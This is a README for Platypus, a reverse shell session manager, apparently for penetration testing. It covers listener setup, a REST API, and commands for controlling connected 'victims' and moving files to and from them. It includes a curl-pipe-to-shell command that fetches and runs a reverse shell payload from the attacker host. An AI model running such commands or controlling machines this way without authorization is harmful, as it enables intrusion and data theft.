A modern multiple reverse shell sessions/clients manager via terminal written in go


## Features

- [x] Multiple service listening port
- [x] Multiple client connections
- [x] [RESTful API](./doc/RESTful.md)
- [x] [Python SDK](https://github.com/WangYihang/Platypus-Python)

- [x] Full interactive shell
  - [x] Using vim gracefully in reverse shell
  - [x] Using CTRL+C and CTRL+Z in reverse shell
- [x] Start servers automatically

## Get Start

> There are multiple ways to run this tool, feel free to choose one of the following method.

### Run Platypus from source code

```bash
git clone https://github.com/WangYihang/Platypus
cd Platypus
go run platypus.go
```

### Run Platypus from release binaries
1. Download `Platypus` prebuild binary from [HERE](https://github.com/WangYihang/Platypus/releases)
2. Run the downloaded executable file

## Usage

### Network Topology

* Attack IP: `192.168.88.129`
  * Reverse Shell Service: `0.0.0.0:1337`
  * Reverse Shell Service: `0.0.0.0:1338`
  * RESTful Service: `127.0.0.1:7331`
* Victim IP: `192.168.88.130`

### Give it a try

First, run `./Platypus`, then the `config.yml` will be generated automatically, and the config file is simple enough.

```yaml
servers: 
  - host: "0.0.0.0"
    port: 1337
    #¬†Platypus¬†is¬†able¬†to¬†use¬†several¬†properties¬†as¬†unique¬†identifier¬†(primirary¬†key)¬†of¬†a¬†single¬†client.
    #¬†All¬†available¬†properties¬†are¬†listed¬†below:
    #¬†`%i`¬†IP
    #¬†`%u`¬†Username
    #¬†`%m`¬†MAC¬†address
    #¬†`%o`¬†Operating¬†System
    #¬†`%t`¬†Income TimeStamp
    hashFormat: "%i %u %m %o"
  - host: "0.0.0.0"
    port: 1338
    # Using TimeStamp allows us to track all connections from the same IP / Username / OS and MAC.
    hashFormat: "%i %u %m %o %t"
restful:
  host: "127.0.0.1"
  port: 7331
  enable: true
# Check new releases from GitHub when starting Platypus
update: false
```

![](./figure/start.gif)

As you can see, platypus will check for updates, then start listening on port 1337, 1338 and 7331

The three port have different aims.
- 1337 Reverse shell server, which **disallows** the reverse session comes from the IP.
- 1338 Reverse shell server, which **allows** the reverse session comes from the IP.
- 7331 Platypus [RESTful](./doc/RESTful.md) API EndPoint, which allows you to manipulate Platypus through HTTP protocol or [Python SDK](./doc/SDK.md).

If you want another reverse shell listening port, just type `Run 0.0.0.0 1339` or modify the `config.yml`.

Also, platypus will print help information about [RaaS](./doc/RaaS.md) which release you from remembering  tedious reverse shell commands. 

With platypus, all you have to do is just copy-and-paste the `curl` command and execute it on the victim machine.

```bash
curl http://127.0.0.1:1337/|sh
curl http://192.168.88.129:1337/|sh
```

Now, suppose that the victim is attacked by the attacker and a reverse shell command will be executed on the machine of victim.

> Notice, the RaaS feature ensure that the reverse shell process is running in background and ignore the hangup signal.

### Controlling the victim

#### List all victims

You can use `List` command to print table style infomation about all listening servers and connected clients. Notice that the port `1337` will reset the connection from the same machine (we consider two connection are same iff they share the same Hash value, the info being hash can be configured in `config.yml`). Port `1338` will not reset such connections, which provide more repliability.

![](./figure/list.gif)

#### Select a victim

`Jump` command can take you a tour between clients.
Use `Jump [HASH / Alias]` to jump. `Alias` is a alias of a specific client, you can set a alias of a client via `Alias [ALIAS]`.
Also, for jumping through `HASH`, you do not need to type the whole hash, just prefix of hash will work.

> All commands are case insensitive, feel free to use tab for completing.

#### Interactive shell

`Interact` will popup a shell, just like `netcat`.

![](./figure/interact.gif)

#### Download file

Use `Download` command to download file from reverse shell client to attacker's machine.

![](./figure/download.gif)

#### Upload file

Use `Upload` command to upload file to the current interacting client.

![](./figure/upload.gif)

#### Interactive shell mode

Try to Spawn `/bin/bash` via Python, then the shell is fully interactive (You can use vim / htop and other stuffs).
First use `Jump` to select a client, then type `PTY`, then type `Interact` to drop into a fully interactive shell.
You can just simply type `exit` to exit pty mode.

### Advanced [Usages](./doc)

* Reverse shell as a Service (RaaS)
* RESTful API
* Python SDK

#### Using `VIM` in Reverse Shell (Only on `Linux`)
> Demonstration is to be done.
